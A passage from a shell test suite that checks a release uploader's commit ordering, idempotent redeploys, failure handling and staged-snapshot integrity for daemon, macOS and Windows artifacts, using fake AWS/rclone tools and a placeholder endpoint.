[ "$(aws_write_count "$daemon_payload_failure_log" "$daemon_latest_uri")" -eq 0 ] ||
	fail 'daemon deploy advanced latest after an immutable payload PUT failure'
pass 'daemon publication is no-op safe, replaceable at current version, retryable, and commit ordered'

daemon_toctou_dist="$tmp_dir/daemon-post-staging-mutation"
write_daemon_release "$daemon_toctou_dist" "$release_version"
daemon_toctou_name="notty-daemon_${release_version}_linux_arm64.tar.gz"
daemon_toctou_source="$daemon_toctou_dist/$release_version/$daemon_toctou_name"
daemon_toctou_before="$(fixture_sha256 "$daemon_toctou_source")"
daemon_toctou_aws_log="$tmp_dir/daemon-post-staging-mutation.aws.log"
daemon_toctou_capture="$tmp_dir/daemon-post-staging-mutation.capture"
daemon_mutation_bin="$tmp_dir/daemon-mutation-bin"
daemon_real_go="$(command -v go)"
mkdir "$daemon_toctou_capture" "$daemon_mutation_bin"
cat >"$daemon_mutation_bin/go" <<'GO'
#!/usr/bin/env sh
set -eu
[ "${1:-}" = run ] || exit 64
printf 'post-staging mutation\n' >>"$DAEMON_MUTATE_SOURCE"
exec "$DAEMON_REAL_GO" "$@"
GO
chmod +x "$daemon_mutation_bin/go"
: >"$daemon_toctou_aws_log"
PATH="$daemon_mutation_bin:$fake_bin:$PATH" AWS_LOG="$daemon_toctou_aws_log" \
	DAEMON_CAPTURE_DIR="$daemon_toctou_capture" DAEMON_MUTATE_SOURCE="$daemon_toctou_source" \
	DAEMON_REAL_GO="$daemon_real_go" DAEMON_DIST_ROOT="$daemon_toctou_dist" \
	UPLOAD_TARGET=daemon R2_ENDPOINT_URL=https://example.invalid \
	R2_DAEMONS_BUCKET=static R2_DAEMONS_PREFIX=daemons \
	"$repo_dir/scripts/upload-r2.sh" >/dev/null
daemon_toctou_after="$(fixture_sha256 "$daemon_toctou_source")"
[ "$daemon_toctou_before" != "$daemon_toctou_after" ] || fail 'daemon post-staging source mutation hook did not run'
for daemon_captured in "$daemon_toctou_name" SHA256SUMS manifest.json; do
	[ -f "$daemon_toctou_capture/$daemon_captured" ] || fail "daemon staged upload did not capture $daemon_captured"
done
daemon_toctou_uploaded="$(fixture_sha256 "$daemon_toctou_capture/$daemon_toctou_name")"
daemon_toctou_checksum="$(awk -v name="$daemon_toctou_name" '$2 == name { print $1 }' "$daemon_toctou_capture/SHA256SUMS")"
daemon_toctou_manifest="$(
	awk -F '"sha256": "' -v name="$daemon_toctou_name" \
		'index($0, "\"file\": \"" name "\"") { split($2, fields, "\""); print fields[1] }' \
		"$daemon_toctou_capture/manifest.json"
)"
[ "$daemon_toctou_uploaded" = "$daemon_toctou_before" ] || fail 'daemon upload did not preserve staged archive bytes'
[ "$daemon_toctou_uploaded" = "$daemon_toctou_checksum" ] || fail 'daemon staged archive differs from staged SHA256SUMS'
[ "$daemon_toctou_uploaded" = "$daemon_toctou_manifest" ] || fail 'daemon staged archive differs from staged manifest'
[ "$daemon_toctou_uploaded" != "$daemon_toctou_after" ] || fail 'daemon upload followed the mutable source after staging'
if grep -Fq "$daemon_toctou_dist/" "$daemon_toctou_aws_log"; then
	fail 'daemon uploader received a mutable shared-source path'
fi
[ "$(aws_write_count "$daemon_toctou_aws_log" "$daemon_latest_uri")" -eq 1 ] ||
	fail 'daemon deploy did not advance latest exactly once after staged publication'
pass 'daemon upload publishes one verified private snapshot and advances latest once'

macos_dist="$tmp_dir/macos"
write_macos_release "$macos_dist"
PATH="$fake_bin:$PATH" AWS_LOG="$aws_log" MACOS_GUI_DIST_DIR="$macos_dist" UPLOAD_TARGET=macos-gui \
	R2_ENDPOINT_URL=https://example.invalid R2_DESKTOP_BUCKET=static R2_DESKTOP_PREFIX=desktop \
	"$repo_dir/scripts/upload-r2.sh" >/dev/null

macos_latest_manifest_uri='s3://static/desktop/macos/latest/manifest.json'
macos_latest_sha_uri='s3://static/desktop/macos/latest/SHA256SUMS'
macos_version_uri="s3://static/desktop/macos/$release_version/"
macos_ledger_uri="${macos_version_uri}manifest.json"
macos_ledger_line="$(aws_first_write_line "$aws_log" "$macos_ledger_uri")"
macos_latest_sha_line="$(aws_first_write_line "$aws_log" "$macos_latest_sha_uri")"
macos_latest_manifest_line="$(aws_first_write_line "$aws_log" "$macos_latest_manifest_uri")"
[ "$(aws_write_count "$aws_log" "$macos_version_uri")" -eq 3 ] ||
	fail 'macOS GUI deploy did not write payloads and their version ledger exactly once each'
for macos_payload_name in "Codesk_${release_version}_macos_universal.dmg" SHA256SUMS; do
	macos_payload_uri="$macos_version_uri$macos_payload_name"
	[ "$(aws_write_count "$aws_log" "$macos_payload_uri")" -eq 1 ] ||
		fail "macOS GUI payload was not put exactly once: $macos_payload_name"
	macos_payload_line="$(aws_first_write_line "$aws_log" "$macos_payload_uri")"
	[ "$macos_payload_line" -lt "$macos_ledger_line" ] ||
		fail "macOS GUI version ledger preceded payload publication: $macos_payload_name"
done
[ "$macos_ledger_line" -lt "$macos_latest_sha_line" ] &&
	[ "$macos_latest_sha_line" -lt "$macos_latest_manifest_line" ] ||
	fail 'macOS GUI payload, ledger, checksum pointer, and latest pointer were not commit ordered'

macos_retry_store="$tmp_dir/macos-retry-store"
macos_retry_log="$tmp_dir/macos-retry.aws.log"
macos_retry_assert_log="$tmp_dir/macos-retry-ledger-assert.log"
macos_retry_payload_name="Codesk_${release_version}_macos_universal.dmg"
macos_retry_payload_source="$macos_dist/$release_version/$macos_retry_payload_name"
macos_retry_payload_uri="$macos_version_uri$macos_retry_payload_name"
macos_retry_payload_store="$macos_retry_store/${macos_retry_payload_uri#s3://}"
preseed_equal_size_mismatch "$macos_retry_payload_source" "$macos_retry_payload_store"
: >"$macos_retry_log"
: >"$macos_retry_assert_log"
PATH="$fake_bin:$PATH" AWS_LOG="$macos_retry_log" AWS_OBJECT_STORE_DIR="$macos_retry_store" \
	AWS_LEDGER_ASSERT_COMMIT_URI="$macos_ledger_uri" \
	AWS_LEDGER_ASSERT_PAYLOAD_URI="$macos_retry_payload_uri" \
	AWS_LEDGER_ASSERT_PAYLOAD_SOURCE="$macos_retry_payload_source" \
	AWS_LEDGER_ASSERT_LOG="$macos_retry_assert_log" \
	MACOS_GUI_DIST_DIR="$macos_dist" UPLOAD_TARGET=macos-gui \
	R2_ENDPOINT_URL=https://example.invalid R2_DESKTOP_BUCKET=static R2_DESKTOP_PREFIX=desktop \
	"$repo_dir/scripts/upload-r2.sh" >/dev/null
cmp -s "$macos_retry_payload_source" "$macos_retry_payload_store" ||
	fail 'macOS GUI retry did not replace an equal-sized stale payload'
[ "$(cat "$macos_retry_assert_log")" = "$macos_ledger_uri" ] ||
	fail 'macOS GUI retry did not verify payload bytes before committing the ledger'
[ -f "$macos_retry_store/${macos_ledger_uri#s3://}" ] ||
	fail 'macOS GUI retry did not commit the version ledger after payload replacement'
pass 'macOS GUI retry unconditionally replaces stale equal-sized payloads before ledger commit'

macos_find_failure_log="$tmp_dir/macos-release-find-failure.rclone.log"
: >"$macos_find_failure_log"
if BSD_FIND_REAL="$bsd_find_real" BSD_SORT_REAL="$bsd_sort_real" \
	FAIL_COMMITTED_FIND=1 FAIL_COMMITTED_FIND_BASENAME="$release_version" \
	PATH="$bsd_find_bin:$fake_bin:$PATH" RCLONE_LOG="$macos_find_failure_log" \
	MACOS_GUI_DIST_DIR="$macos_dist" UPLOAD_TARGET=macos-gui \
	R2_ENDPOINT_URL=https://example.invalid \
	R2_DESKTOP_BUCKET=static R2_DESKTOP_PREFIX=desktop \
	"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/macos-release-find-failure.output" 2>&1; then
	fail 'rclone macOS GUI deploy masked immutable payload enumeration failure'
fi
[ "$(rclone_write_count "$macos_find_failure_log")" -eq 0 ] ||
	fail 'rclone macOS GUI payload enumeration failure allowed an R2 write'

macos_rclone_payload_failure_log="$tmp_dir/macos-payload-put-failure.rclone.log"
macos_rclone_payload_failure_key="static/desktop/macos/$release_version/SHA256SUMS"
: >"$macos_rclone_payload_failure_log"
if PATH="$fake_bin:$PATH" RCLONE_LOG="$macos_rclone_payload_failure_log" \
	RCLONE_FAIL_PAYLOAD_KEY="$macos_rclone_payload_failure_key" \
	MACOS_GUI_DIST_DIR="$macos_dist" UPLOAD_TARGET=macos-gui \
	R2_ENDPOINT_URL=https://example.invalid \
	R2_DESKTOP_BUCKET=static R2_DESKTOP_PREFIX=desktop \
	"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/macos-payload-put-failure.output" 2>&1; then
	fail 'rclone macOS GUI deploy swallowed an immutable payload upload failure'
fi
[ "$(rclone_write_count "$macos_rclone_payload_failure_log" "nottyr2:static/desktop/macos/$release_version/")" -gt 0 ] ||
	fail 'rclone macOS GUI payload failure hook did not run mid-loop'
[ "$(rclone_write_count "$macos_rclone_payload_failure_log" "nottyr2:static/desktop/macos/$release_version/manifest.json")" -eq 0 ] ||
	fail 'rclone macOS GUI payload failure allowed the version ledger commit'
[ "$(rclone_write_count "$macos_rclone_payload_failure_log" 'nottyr2:static/desktop/macos/latest/')" -eq 0 ] ||
	fail 'rclone macOS GUI payload failure allowed a latest commit'
pass 'rclone macOS GUI discovery and payload failures cannot reach a commit upload'

macos_remote_manifest="$macos_dist/$release_version/manifest.json"
macos_noop_log="$tmp_dir/macos-identical-redeploy.aws.log"
: >"$macos_noop_log"
PATH="$fake_bin:$PATH" AWS_LOG="$macos_noop_log" \
	AWS_REMOTE_LATEST="$macos_remote_manifest" AWS_REMOTE_LEDGER="$macos_remote_manifest" \
	MACOS_GUI_DIST_DIR="$macos_dist" \
	UPLOAD_TARGET=macos-gui R2_ENDPOINT_URL=https://example.invalid \
	R2_DESKTOP_BUCKET=static R2_DESKTOP_PREFIX=desktop \
	"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/macos-identical-redeploy.output"
[ "$(aws_write_count "$macos_noop_log")" -eq 0 ] || fail 'identical macOS GUI redeploy was not a zero-write no-op'

macos_conflict_dist="$tmp_dir/macos-same-version-conflict"
write_macos_release "$macos_conflict_dist" changed
macos_conflict_log="$tmp_dir/macos-same-version-conflict.aws.log"
: >"$macos_conflict_log"
if PATH="$fake_bin:$PATH" AWS_LOG="$macos_conflict_log" \
	AWS_REMOTE_LATEST="$macos_remote_manifest" AWS_REMOTE_LEDGER="$macos_remote_manifest" \
	MACOS_GUI_DIST_DIR="$macos_conflict_dist" \
	UPLOAD_TARGET=macos-gui R2_ENDPOINT_URL=https://example.invalid \
	R2_DESKTOP_BUCKET=static R2_DESKTOP_PREFIX=desktop \
	"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/macos-same-version-conflict.output" 2>&1; then
	fail 'macOS GUI deploy rewrote an already-published version'
fi
[ "$(aws_write_count "$macos_conflict_log")" -eq 0 ] || fail 'conflicting macOS GUI redeploy wrote before failing'

macos_forward_completion_log="$tmp_dir/macos-forward-completion.aws.log"
: >"$macos_forward_completion_log"
PATH="$fake_bin:$PATH" AWS_LOG="$macos_forward_completion_log" \
	AWS_REMOTE_LATEST="$daemon_older_latest" AWS_REMOTE_LEDGER="$macos_remote_manifest" \
	MACOS_GUI_DIST_DIR="$macos_dist" UPLOAD_TARGET=macos-gui \
	R2_ENDPOINT_URL=https://example.invalid R2_DESKTOP_BUCKET=static R2_DESKTOP_PREFIX=desktop \
	"$repo_dir/scripts/upload-r2.sh" >/dev/null
[ "$(aws_write_count "$macos_forward_completion_log" "$macos_version_uri")" -eq 0 ] ||
	fail 'macOS GUI forward completion rewrote immutable version bytes'
[ "$(aws_write_count "$macos_forward_completion_log" "$macos_latest_sha_uri")" -eq 1 ] ||
	fail 'macOS GUI forward completion did not refresh latest checksums exactly once'
[ "$(aws_write_count "$macos_forward_completion_log" "$macos_latest_manifest_uri")" -eq 1 ] ||
	fail 'macOS GUI forward completion did not advance latest exactly once'
macos_forward_sha_line="$(aws_first_write_line "$macos_forward_completion_log" "$macos_latest_sha_uri")"
macos_forward_manifest_line="$(aws_first_write_line "$macos_forward_completion_log" "$macos_latest_manifest_uri")"
[ "$macos_forward_sha_line" -lt "$macos_forward_manifest_line" ] ||
	fail 'macOS GUI forward completion committed latest before its checksums'

expect_macos_publication_failure macos-historical-rewrite \
	"$macos_conflict_dist" "$daemon_older_latest" "$macos_remote_manifest"
macos_wrong_version_dist="$tmp_dir/macos-candidate-version-mismatch"
write_macos_release "$macos_wrong_version_dist"
awk -v version="$daemon_newer_version" \
	'/^  "version": / { $0 = "  \"version\": \"" version "\"," } { print }' \
	"$macos_wrong_version_dist/$release_version/manifest.json" >"$macos_wrong_version_dist/manifest.json.new"
mv "$macos_wrong_version_dist/manifest.json.new" \
	"$macos_wrong_version_dist/$release_version/manifest.json"
expect_macos_publication_failure macos-candidate-version-mismatch "$macos_wrong_version_dist" '' ''

macos_sha_failure_log="$tmp_dir/macos-latest-sha-failure.aws.log"
: >"$macos_sha_failure_log"
if PATH="$fake_bin:$PATH" AWS_LOG="$macos_sha_failure_log" AWS_FAIL_LATEST_SHA=1 \
	MACOS_GUI_DIST_DIR="$macos_dist" UPLOAD_TARGET=macos-gui \
	R2_ENDPOINT_URL=https://example.invalid R2_DESKTOP_BUCKET=static R2_DESKTOP_PREFIX=desktop \
	"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/macos-latest-sha-failure.output" 2>&1; then
	fail 'macOS GUI deploy swallowed a latest checksum failure'
fi
[ "$(aws_write_count "$macos_sha_failure_log" "$macos_latest_manifest_uri")" -eq 0 ] ||
	fail 'macOS GUI deploy committed latest before its checksum pointer succeeded'
pass 'macOS GUI ledger/pointer states preserve immutable bytes and commit metadata in order'

windows_dist="$tmp_dir/windows"
for arch in amd64 arm64; do
	write_windows_bundle "$windows_dist" "$arch" "$source_head" "$source_base" true
done
windows_no_go_log="$tmp_dir/windows-native-go.log"
windows_rclone_log="$tmp_dir/windows-rclone.log"
: >"$windows_no_go_log"
: >"$windows_rclone_log"
PATH="$no_go_bin:$fake_bin:$PATH" NO_GO_LOG="$windows_no_go_log" \
	AWS_LOG="$aws_log" RCLONE_LOG="$windows_rclone_log" \
	WINDOWS_GUI_MSI_ROOT="$windows_dist" UPLOAD_TARGET=windows-gui \
	R2_ENDPOINT_URL=https://example.invalid R2_DESKTOP_BUCKET=static R2_DESKTOP_PREFIX=desktop \
	"$repo_dir/scripts/upload-r2.sh" >/dev/null
[ ! -s "$windows_no_go_log" ] || fail 'Windows GUI deploy invoked native host Go'
grep -Fq 'lsjson nottyr2:static/desktop/windows/latest/manifest.json --stat --files-only' "$windows_rclone_log" ||
	fail 'Windows GUI publication guard did not stat its latest object with rclone'
grep -F 'copyto ' "$windows_rclone_log" | grep -Fq -- '--no-check-dest --header-upload Content-Type:' ||
	fail 'Windows GUI publication did not use forced rclone uploads with explicit metadata'

windows_version_uri="s3://static/desktop/windows/$release_version/"
windows_ledger_uri="${windows_version_uri}manifest.json"
windows_latest_uri='s3://static/desktop/windows/latest/manifest.json'
windows_remote_latest="$tmp_dir/windows-remote-latest-manifest.json"
write_windows_manifest "$windows_dist" "$windows_remote_latest"
windows_ledger_line="$(aws_first_write_line "$aws_log" "$windows_ledger_uri")"
windows_latest_line="$(aws_first_write_line "$aws_log" "$windows_latest_uri")"
[ "$(aws_write_count "$aws_log" "$windows_version_uri")" -eq 7 ] ||
	fail 'Windows GUI deploy did not write six payload files and one version ledger'
for windows_arch in amd64 arm64; do
	for windows_version_file in \
		"Codesk_${release_version}_windows_${windows_arch}.msi" SHA256SUMS provenance.json
	do
		windows_payload_uri="${windows_version_uri}${windows_arch}/$windows_version_file"
		windows_payload_line="$(aws_first_write_line "$aws_log" "$windows_payload_uri")"
		[ "$windows_payload_line" -lt "$windows_ledger_line" ] ||
			fail "Windows GUI version ledger preceded $windows_arch/$windows_version_file"
	done
done
[ "$windows_ledger_line" -lt "$windows_latest_line" ] ||
	fail 'Windows GUI latest preceded its version ledger'
pass 'Windows GUI deploy needs no native Go and commits its version ledger after all six payload files'

windows_noop_log="$tmp_dir/windows-identical-redeploy.aws.log"
: >"$windows_noop_log"
PATH="$fake_bin:$PATH" AWS_LOG="$windows_noop_log" \
	AWS_REMOTE_LATEST="$windows_remote_latest" AWS_REMOTE_LEDGER="$windows_remote_latest" \
	WINDOWS_GUI_MSI_ROOT="$windows_dist" UPLOAD_TARGET=windows-gui \
	R2_ENDPOINT_URL=https://example.invalid R2_DESKTOP_BUCKET=static R2_DESKTOP_PREFIX=desktop \
	"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/windows-identical-redeploy.output"
[ "$(aws_write_count "$windows_noop_log")" -eq 0 ] || fail 'identical Windows GUI redeploy was not a zero-write no-op'

windows_conflict_dist="$tmp_dir/windows-same-version-conflict"
for arch in amd64 arm64; do
	write_windows_bundle "$windows_conflict_dist" "$arch" "$source_head" "$source_base" true changed
done
windows_conflict_log="$tmp_dir/windows-same-version-conflict.aws.log"
: >"$windows_conflict_log"
if PATH="$fake_bin:$PATH" AWS_LOG="$windows_conflict_log" \
	AWS_REMOTE_LATEST="$windows_remote_latest" AWS_REMOTE_LEDGER="$windows_remote_latest" \
	WINDOWS_GUI_MSI_ROOT="$windows_conflict_dist" UPLOAD_TARGET=windows-gui \
	R2_ENDPOINT_URL=https://example.invalid R2_DESKTOP_BUCKET=static R2_DESKTOP_PREFIX=desktop \
	"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/windows-same-version-conflict.output" 2>&1; then
	fail 'Windows GUI deploy rewrote an already-published version'
fi
[ "$(aws_write_count "$windows_conflict_log")" -eq 0 ] || fail 'conflicting Windows GUI redeploy wrote before failing'

windows_forward_completion_log="$tmp_dir/windows-forward-completion.aws.log"
: >"$windows_forward_completion_log"
PATH="$no_go_bin:$fake_bin:$PATH" NO_GO_LOG="$windows_no_go_log" \
	AWS_LOG="$windows_forward_completion_log" AWS_REMOTE_LATEST="$daemon_older_latest" \
	AWS_REMOTE_LEDGER="$windows_remote_latest" WINDOWS_GUI_MSI_ROOT="$windows_dist" \
	UPLOAD_TARGET=windows-gui R2_ENDPOINT_URL=https://example.invalid \
	R2_DESKTOP_BUCKET=static R2_DESKTOP_PREFIX=desktop \
	"$repo_dir/scripts/upload-r2.sh" >/dev/null
[ "$(aws_write_count "$windows_forward_completion_log" "$windows_version_uri")" -eq 0 ] ||
	fail 'Windows GUI forward completion rewrote immutable MSI release bytes'
[ "$(aws_write_count "$windows_forward_completion_log" "$windows_latest_uri")" -eq 1 ] ||
	fail 'Windows GUI forward completion did not advance latest exactly once'
[ ! -s "$windows_no_go_log" ] || fail 'Windows GUI forward completion invoked native host Go'

expect_windows_publication_failure windows-historical-rewrite \
	"$windows_conflict_dist" "$daemon_older_latest" "$windows_remote_latest"
pass 'Windows GUI ledger/pointer states preserve immutable MSI bytes across no-op, conflict, and forward completion'

toctou_dist="$tmp_dir/windows-post-staging-mutation"
for arch in amd64 arm64; do
	write_windows_bundle "$toctou_dist" "$arch" "$source_head" "$source_base" true
done
toctou_source_before="$(fixture_sha256 "$toctou_dist/arm64/Codesk_${release_version}_windows_arm64.msi")"
toctou_aws_log="$tmp_dir/windows-post-staging-mutation.aws.log"
toctou_capture="$tmp_dir/windows-post-staging-mutation.capture"
mkdir "$toctou_capture"
: >"$toctou_aws_log"
PATH="$fake_bin:$PATH" AWS_LOG="$toctou_aws_log" AWS_CAPTURE_DIR="$toctou_capture" \
	WINDOWS_GUI_MUTATE_SOURCE_ROOT="$toctou_dist" WINDOWS_GUI_MSI_ROOT="$toctou_dist" \
	UPLOAD_TARGET=windows-gui R2_ENDPOINT_URL=https://example.invalid \
	R2_DESKTOP_BUCKET=static R2_DESKTOP_PREFIX=desktop \
	"$repo_dir/scripts/upload-r2.sh" >/dev/null
toctou_source_after="$(fixture_sha256 "$toctou_dist/arm64/Codesk_${release_version}_windows_arm64.msi")"
[ "$toctou_source_before" != "$toctou_source_after" ] || fail 'Windows GUI post-staging source mutation hook did not run'
for captured in arm64.msi arm64.SHA256SUMS manifest.json; do
	[ -f "$toctou_capture/$captured" ] || fail "Windows GUI staged upload did not capture $captured"
done
toctou_uploaded_sha="$(fixture_sha256 "$toctou_capture/arm64.msi")"
toctou_checksum_sha="$(awk 'NR == 1 { print $1 }' "$toctou_capture/arm64.SHA256SUMS")"
toctou_manifest_sha="$(awk -F '"sha256": "' '/"arch": "arm64"/ { split($2, fields, "\""); print fields[1] }' "$toctou_capture/manifest.json")"
[ "$toctou_uploaded_sha" = "$toctou_source_before" ] || fail 'Windows GUI upload did not preserve the staged ARM64 MSI bytes'
[ "$toctou_uploaded_sha" = "$toctou_checksum_sha" ] || fail 'Windows GUI uploaded ARM64 MSI differs from uploaded SHA256SUMS'
[ "$toctou_uploaded_sha" = "$toctou_manifest_sha" ] || fail 'Windows GUI uploaded ARM64 MSI differs from generated manifest'
[ "$toctou_uploaded_sha" != "$toctou_source_after" ] || fail 'Windows GUI upload followed the mutable shared source after staging'
if grep -Fq "$toctou_dist/" "$toctou_aws_log"; then
	fail 'Windows GUI uploader received a mutable shared-source path'
fi
pass 'Windows GUI upload validates and publishes one private staged snapshot'

wrong_hash_dist="$tmp_dir/windows-wrong-hash"
for arch in amd64 arm64; do
	write_windows_bundle "$wrong_hash_dist" "$arch" "$source_head" "$source_base" true
done
wrong_hash_provenance="$(fixture_sha256 "$wrong_hash_dist/amd64/provenance.json")"
printf '%064d  Codesk_%s_windows_amd64.msi\r\n%s  provenance.json\r\n' \
	0 "$release_version" "$wrong_hash_provenance" >"$wrong_hash_dist/amd64/SHA256SUMS"
expect_windows_preflight_failure wrong-hash "$wrong_hash_dist"

wrong_provenance_dist="$tmp_dir/windows-wrong-provenance"
write_windows_bundle "$wrong_provenance_dist" amd64 "$source_head" "$source_base" false
write_windows_bundle "$wrong_provenance_dist" arm64 "$source_head" "$source_base" true
expect_windows_preflight_failure wrong-provenance "$wrong_provenance_dist"

extra_file_dist="$tmp_dir/windows-extra-file"
for arch in amd64 arm64; do
	write_windows_bundle "$extra_file_dist" "$arch" "$source_head" "$source_base" true
done
printf 'unexpected\n' >"$extra_file_dist/amd64/debug.log"
expect_windows_preflight_failure extra-file "$extra_file_dist"

stale_arch_dist="$tmp_dir/windows-stale-arch"
write_windows_bundle "$stale_arch_dist" amd64 "$source_head" "$source_base" true
write_windows_bundle "$stale_arch_dist" arm64 0000000000000000000000000000000000000000 "$source_base" true
expect_windows_preflight_failure stale-omitted-arch "$stale_arch_dist"

missing_arch_dist="$tmp_dir/windows-missing-arch"
write_windows_bundle "$missing_arch_dist" amd64 "$source_head" "$source_base" true
expect_windows_preflight_failure missing-second-arch "$missing_arch_dist"
pass 'Windows GUI upload preflights both exact bundles and makes zero writes on causal failures'

for required in \
	"s3://static/daemons/$release_version/" \
	's3://static/daemons/latest/manifest.json' \
	"s3://static/desktop/macos/$release_version/" \
	's3://static/desktop/macos/latest/manifest.json' \
	"s3://static/desktop/windows/$release_version/amd64/Codesk_${release_version}_windows_amd64.msi" \
	"s3://static/desktop/windows/$release_version/arm64/Codesk_${release_version}_windows_arm64.msi" \
	's3://static/desktop/windows/latest/manifest.json'
do
	grep -Fq "$required" "$aws_log" || fail "shared R2 uploader missed route: $required"
done
[ "$(aws_write_count "$aws_log" 's3://static/daemons/latest/manifest.json')" -eq 1 ] ||
	fail 'daemon uploader did not perform exactly one shared latest update'
for forbidden_daemon_route in \
	's3://static/daemons/linux/' 's3://static/daemons/macos/' 's3://static/daemons/windows/' \
	's3://static/daemons/latest/SHA256SUMS'
do
	if grep -Fq "$forbidden_daemon_route" "$aws_log"; then
		fail "daemon uploader retained obsolete route: $forbidden_daemon_route"
	fi
done
pass 'one shared R2 uploader routes one complete daemon release and both desktop GUIs'

grep -Fq 'artifact_base="$static_base"' "$repo_dir/deploy/daemons/install.sh" ||
	fail 'POSIX installer does not preserve the live unprefixed daemon root'
grep -Fq '$artifactBase = $StaticBase' "$repo_dir/deploy/daemons/install.ps1" ||
	fail 'PowerShell installer does not preserve the live unprefixed daemon root'
grep -Fq 'artifact_platform' "$repo_dir/deploy/daemons/install.sh" &&
	fail 'POSIX installer retained a platform-prefixed daemon root'
grep -Fq 'Join-RemotePath $StaticBase "windows"' "$repo_dir/deploy/daemons/install.ps1" &&
	fail 'PowerShell installer retained a platform-prefixed daemon root'
pass 'daemon installers preserve the live version-first latest metadata path'

# Every lowercase $var referenced in a deploy script must be assigned in that same
# script. Uppercase names are env vars and excluded, so this catches the real failure
# class: an append-only hunk referencing a variable renamed out from under it (e.g.
# $version after the version->git_sha rename), which set -eu would otherwise only fail
# on mid-deploy, after the image is already pushed. Covers all deploy legs plus the
# backend image build. The build-daemon-*/build-macos-* scripts are intentionally out
# of scope — they assign via patterns this cheap scan doesn't model (case branches,
# arithmetic), so they'd false-positive; shellcheck SC2154 is the proper tool for those.
# This is a net, not a proof: `export name=`, `read name`, and `for name in` are handled,
# but a sourced assignment would still slip through.
# DO NOT REMOVE thinking "we already execute these": no fixture runs deploy-backend.sh,
# deploy-frontend.sh, deploy-homepage.sh, or deploy-macos-gui.sh, so set -eu never fires
# for them in tests — this static scan is the ONLY thing catching a dangling variable
# before a live deploy, which is exactly why the original $version bug sat for 17 days.
for deploy_script in "$repo_dir"/scripts/deploy-*.sh "$repo_dir/scripts/build-backend-image.sh"; do
	assigned_vars="$( {
		sed -n 's/^[[:space:]]*\(export[[:space:]]\{1,\}\)\{0,1\}\([a-z_][a-z0-9_]*\)=.*/\2/p' "$deploy_script"
		sed -n 's/^[[:space:]]*read[[:space:]]\{1,\}//p' "$deploy_script" | tr ' ' '\n'
		sed -n 's/^[[:space:]]*for[[:space:]]\{1,\}\([a-z_][a-z0-9_]*\)[[:space:]].*/\1/p' "$deploy_script"
	} | grep -E '^[a-z_][a-z0-9_]*$' | sort -u)"
	for referenced_var in $(grep -oE '\$\{?[a-z_][a-z0-9_]*' "$deploy_script" | sed 's/[${]//g' | sort -u); do
		printf '%s\n' "$assigned_vars" | grep -qx "$referenced_var" ||
			fail "$(basename "$deploy_script") references \$$referenced_var but never assigns it — a renamed or typo'd variable set -eu would abort a live deploy on"
	done
	pass "$(basename "$deploy_script"): every referenced shell variable is assigned in-script"
done

printf '%s\n' 'All build/deploy contract tests passed.'
